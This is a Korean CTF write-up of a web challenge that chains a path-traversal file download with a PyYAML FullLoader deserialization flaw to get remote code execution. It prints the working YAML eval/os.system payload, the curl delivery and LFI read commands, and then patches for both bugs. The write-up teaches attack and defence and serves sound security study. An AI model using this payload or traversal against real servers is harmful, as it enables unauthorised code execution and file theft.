---
title: ["[WHITEHAT 2025 qual CTF- web] Scenario"]
date: 2025-10-19 09:00:00 +0900
last_modified_at: 2025-10-19 09:00:00 +0900
categories: [writeup, ctf]
tags: [web, path traversal, deserializaion, RCE]
---

## 문제 설명
### 시나리오
> 최근 정보 공개 서비스를 출시한 공공기관의 웹 서버에서 비정상적인 행동을 감지하였습니다. 취약점 평가 및 검사 전문가로 고용되어 조사를 수행하게 되었습니다. 서버의 취약점과 백도어를 찾아 제거하고, 이를 통해 공격자에 대한 정보를 파악해주세요.

### 설명
> 웹 서버에서 실행되는 유일한 서비스가 정보 공개 서비스이므로, 이 서비스가 서버 공격의 경로였을 것으로 추정됩니다. 이 정보 공개 서비스의 취약점을 입증해주세요. 웹 서비스는 app.py에서 운영되고 있습니다.

## 접근 방법
Dockerfile을 포함한 코드가 주어지지 않는 문제였다.  
제공된 서버에 사용자의 입력이 인젝션되는 포인트부터 찾아나가면 된다.  

`/download?file=traffic.json`과 같은 형태로 공공 데이터를 제공해주는 서버인데,  
해당 경로로 local file을 다운로드 할 수 있는 취약점이 있었다.  

취약점을 이용해 문제를 구성하는 `app.py`, `files.py`, `theme.py`, `Dockerfile`을 다운로드 받았다.

```
# Dockerfile
# ...
COPY . $APP_HOME 
RUN FLAG_CONTENT=$(cat $APP_HOME/flag.txt) && \ 
    echo "$FLAG_CONTENT" > "/$FLAG_CONTENT" && \ 
    chmod 400 "/$FLAG_CONTENT" && \ 
    chown root:root "/$FLAG_CONTENT" && \ 
    rm $APP_HOME/flag.txt 
# ...
```

 컨테이너를 빌드할 때, `/app/flag.txt`의 내용을 읽어 그 내용과 동일한 이름의 파일을 루트에 만든다.  
 즉, flag는 파일의 이름이다.  

 Bruteforcing을 하지 않는 이상, `files.py`의 LFI로만은 접근하기 어렵다.  
 RCE 포인트를 찾아야 한다.  

 `theme.py`의 `/api/theme/preview` 엔드포인트에서,  

 ```python
parsed: Any = yaml.load(body, Loader=yaml.FullLoader)
```  

해당 부분이 YAML Deserialization 취약점이 있다. `yaml.FullLoader`는 Python 객체를 deserialization할 수 있어, RCE가 가능하다.  

## Exploitation
### Payload
PyYAML의 `!!python/object/new` 태그를 사용하여 임의의 Python 코드를 실행할 수 있다.  

```yaml
!!python/object/new:tuple
- !!python/object/new:map
  - !!python/name:eval
  - ["__import__('os').system('ls -la / >/tmp/f')"]
```  

- `!!python/object/new:tuple`: 새로운 tuple 객체 생성
- `!!python/name:eval`: Python의 eval 함수 호출
- `__import__('os').system()`: os 모듈을 import하여 시스템 명령 실행
- `ls -la /`: 루트 디렉토리의 파일 목록 조회
- `>/tmp/f`: 결과를 /tmp/f 파일에 저장

### Payload Delivery
```bash
cat > payload.yaml << 'EOF'
!!python/object/new:tuple
- !!python/object/new:map
  - !!python/name:eval
  - ["__import__('os').system('ls -la / >/tmp/f')"]
EOF

curl -X POST http://[HOST]/api/theme/preview \
  -H "Content-Type: application/x-yaml" \
  --data-binary @payload.yaml
```

### Confirming Result by LFI
```bash
curl "http://[HOST]/download?file=../../tmp/f"
```

## 취약점 패치
### YAML Deserialization 취약점
```python
parsed: Any = yaml.load(body, Loader=yaml.FullLoader)
```  
**취약점:**  
- `yaml.FullLoader`는 Python 객체를 역직렬화할 수 있음
- 공격자가 제어하는 YAML 데이터로 임의 Python 코드 실행 가능
- Body 길이 제한(128bytes)이 있지만, 짧은 payload로 우회 가능

**패치:**  
```python
parsed: Any = yaml.load(body, Loader=yaml.SafeLoader) # safeloader 사용
```  
SafeLoader는 `dict`, `list`, `str`, `int`, `float`, `bool`, `None` 등의 기본 데이터 타입만 허용한다.  
만약 SafeLoader를 사용했다면, 페이로드를 사용해도 `yaml.constructor.ConstructorError` 예외가 발생해서 RCE가 되지 않았을 것이다.  
또한, 꼭 YAML이 필요하지 않다면, JSON을 사용하는게 더 안전할 수 있다.  


### Directory Traversal 취약점
```python
def download_file():
    rel = request.args.get("file", "")
    full_path = os.path.join(BASE_DIR, rel)

    if not os.path.exists(full_path):
        return Response("File not found", status=404)

    if not os.path.isfile(full_path):
        return Response("Path is not a file", status=400)

    try:
        return send_file(full_path)
```  
**취약점:**  
원본 코드에서는 사용자 입력을 그대로 파일 경로로 사용하여 `../../`같은 directory traversal 공격이 가능했다.  

**패치:**  
```python
if ".." in rel or rel.startswith("/") or rel.startswith("\\\\"):
    return Response("Invalid file path", status=400)

full_path = os.path.join(BASE_DIR, rel)

# 경로 정규화 및 검증
full_path = os.path.realpath(full_path)
base_real = os.path.realpath(BASE_DIR)
if not full_path.startswith(base_real + os.sep):
    return Response("Invalid file path", status=400)
```

- `..` 문자열 포함, `/`로 시작하는 절대 경로 차단, `\\`로 시작하는 절대 경로 차단
- `os.path.realpath()`: 심볼릭 링크 해석 및 canonicalization
- `.`,`..`, 중복된 `/` 등을 제거하여 실제 경로를 계산
- 정규화된 전체 경로가 BASE_DIR 내부에 있는지 확인